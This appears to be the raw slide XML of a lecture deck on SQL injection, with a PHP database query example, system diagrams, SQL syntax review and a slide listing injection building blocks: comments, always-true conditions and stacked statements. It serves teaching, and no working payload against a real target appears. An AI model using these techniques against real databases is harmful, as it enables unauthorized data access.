              <a:rPr lang="en-US" dirty="0"/>
              <a:t>     while($row = $result-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>fetch_assoc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>         echo "&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>br</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt; id: ". $row["id"]. " - Name: ". $row["</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>firstname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>"]. " " . $row["</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lastname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>"] . "&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>br</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt;";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>     }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="da-DK" dirty="0"/>
              <a:t>} </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="da-DK" dirty="0" err="1"/>
              <a:t>else</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="da-DK" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t>     echo "0 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0" err="1"/>
              <a:t>results</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t>";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES_tradnl" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0" err="1"/>
              <a:t>conn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t>-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0" err="1"/>
              <a:t>close</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t>();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t>?&gt;  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES_tradnl" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t>&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0" err="1"/>
              <a:t>body</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t>&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t>&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0" err="1"/>
              <a:t>html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24319437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Injection Attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="77500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Exploit a security vulnerability in an SQL application (e.g., web application)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A specific case of “incomplete mediation”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Considered as one of the top 10 web application vulnerabilities of 07 and 10</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A large number of incidents</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>2014: Biomedical Engineering Servers, Johns Hopkins University</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>2013: 71 Chinese government databases are compromised using SQL injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>……</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="303758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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1600201"/>
            <a:ext cx="8229600" cy="673644"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>One of the most popular Internet applications</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="764941" y="2438435"/>
            <a:ext cx="7505700" cy="3619500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4162620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 the Hood</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2378146" y="1704178"/>
            <a:ext cx="4349264" cy="2097361"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="5" name="Group 4"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1793017" y="4317218"/>
            <a:ext cx="6492203" cy="1334121"/>
            <a:chOff x="144" y="2496"/>
            <a:chExt cx="5520" cy="1249"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="Text Box 4"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="144" y="2969"/>
              <a:ext cx="801" cy="33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1pPr>
              <a:lvl2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2pPr>
              <a:lvl3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3pPr>
              <a:lvl4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4pPr>
              <a:lvl5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5pPr>
              <a:lvl6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6pPr>
              <a:lvl7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7pPr>
              <a:lvl8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8pPr>
              <a:lvl9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9pPr>
            </a:lstStyle>
            <a:p>
              <a:pPr>
                <a:lnSpc>
                  <a:spcPct val="104000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPts val="1750"/>
                </a:spcBef>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-GB" sz="2800" dirty="0">
                  <a:latin typeface="Trebuchet MS" charset="0"/>
                  <a:ea typeface="宋体" charset="0"/>
                  <a:cs typeface="宋体" charset="0"/>
                </a:rPr>
                <a:t>User</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="Line 5"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="987" y="3136"/>
              <a:ext cx="632" cy="1"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9360">
              <a:solidFill>
                <a:srgbClr val="000000"/>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8" name="Rectangle 7"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1745" y="2496"/>
              <a:ext cx="1559" cy="1215"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="BBE0E3"/>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ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="104000"/>
                </a:lnSpc>
                <a:buClr>
                  <a:srgbClr val="000000"/>
                </a:buClr>
                <a:buSzPct val="100000"/>
                <a:buFont typeface="굴림"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dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Trebuchet MS" charset="0"/>
                </a:rPr>
                <a:t>Web Server</a:t>
              </a:r>
              <a:endParaRPr lang="en-GB" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="Line 7"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3431" y="3137"/>
              <a:ext cx="590" cy="1"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9360">
              <a:solidFill>
                <a:srgbClr val="000000"/>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0" name="AutoShape 8"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4105" y="2530"/>
              <a:ext cx="1559" cy="1215"/>
            </a:xfrm>
            <a:prstGeom prst="can">
              <a:avLst>
                <a:gd name="adj" fmla="val 20713"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="BBE0E3"/>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ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="104000"/>
                </a:lnSpc>
                <a:buClr>
                  <a:srgbClr val="000000"/>
                </a:buClr>
                <a:buSzPct val="100000"/>
                <a:buFont typeface="굴림"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solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Trebuchet MS" charset="0"/>
                </a:rPr>
                <a:t>Database</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34601209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Quick Review of Database</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Querying</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Select</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> column1, column2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Select</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> * </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Querying with conditions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Select</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> column1, column2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>where</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> condition; </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26001530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Quick Review of Database</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Inserting new rows</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>insert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>into</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>set</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> column1=value1, column2=value2; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Updating rows</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>update</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>set</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> column1=value1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>where</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> condition; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Deleting rows</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>delete</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>where</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> condition; </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21859308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Quick Review of Database</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Comments: “--”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>select * from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>student_table</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> --select * from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>faculty_table</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Always true logic: ‘a’ = ‘a’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>select * from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>student_table</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> where ‘a’ = ‘a’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Multi statements: S1;S2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>select * from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>student_table</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>; select * from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>faculty_table</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>; </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2562331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Web Application</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Content Placeholder 3" descr="Picture 3.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15599" y="3107436"/>
            <a:ext cx="5322089" cy="2989420"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="15" name="Group 14"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="377052" y="1325053"/>
            <a:ext cx="7920659" cy="1782383"/>
            <a:chOff x="364188" y="1589771"/>
            <a:chExt cx="8589963" cy="1982788"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="4" name="Group 3"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="364188" y="1589771"/>
              <a:ext cx="8589963" cy="1982788"/>
              <a:chOff x="253" y="2496"/>
              <a:chExt cx="5411" cy="1249"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="5" name="Text Box 4"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="253" y="2825"/>
                <a:ext cx="670" cy="37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spAutoFit/>
              </a:bodyPr>
              <a:lstStyle>
                <a:lvl1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1pPr>
                <a:lvl2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2pPr>
                <a:lvl3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3pPr>
                <a:lvl4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4pPr>
                <a:lvl5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5pPr>
                <a:lvl6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6pPr>
                <a:lvl7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7pPr>
                <a:lvl8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8pPr>
                <a:lvl9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9pPr>
              </a:lstStyle>
              <a:p>
                <a:pPr>
                  <a:lnSpc>
                    <a:spcPct val="104000"/>
                  </a:lnSpc>
                  <a:spcBef>
                    <a:spcPts val="1750"/>
                  </a:spcBef>
                </a:pPr>
                <a:r>
                  <a:rPr lang="en-GB" sz="2800" dirty="0">
                    <a:latin typeface="Trebuchet MS" charset="0"/>
                    <a:ea typeface="宋体" charset="0"/>
                    <a:cs typeface="宋体" charset="0"/>
                  </a:rPr>
                  <a:t>User</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="6" name="Line 5"/>
              <p:cNvSpPr>
                <a:spLocks noChangeShapeType="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="987" y="2934"/>
                <a:ext cx="632" cy="1"/>
              </a:xfrm>
              <a:prstGeom prst="line">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="9360">
                <a:solidFill>
                  <a:srgbClr val="000000"/>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7" name="Rectangle 6"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1745" y="2496"/>
                <a:ext cx="1559" cy="1215"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="BBE0E3"/>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ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="ctr">
                  <a:lnSpc>
                    <a:spcPct val="104000"/>
                  </a:lnSpc>
                  <a:buClr>
                    <a:srgbClr val="000000"/>
                  </a:buClr>
                  <a:buSzPct val="100000"/>
                  <a:buFont typeface="굴림"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dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                    <a:latin typeface="Trebuchet MS" charset="0"/>
                  </a:rPr>
                  <a:t>Web Server</a:t>
                </a:r>
                <a:endParaRPr lang="en-GB" sz="2800" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Trebuchet MS" charset="0"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="8" name="Line 7"/>
              <p:cNvSpPr>
                <a:spLocks noChangeShapeType="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="3431" y="3137"/>
                <a:ext cx="590" cy="1"/>
              </a:xfrm>
              <a:prstGeom prst="line">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="9360">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter lim="800000"/>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9" name="AutoShape 8"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="4105" y="2530"/>
                <a:ext cx="1559" cy="1215"/>
              </a:xfrm>
              <a:prstGeom prst="can">
                <a:avLst>
                  <a:gd name="adj" fmla="val 20713"/>
                </a:avLst>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="BBE0E3"/>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ctr"/>
              <a:lstStyle/>
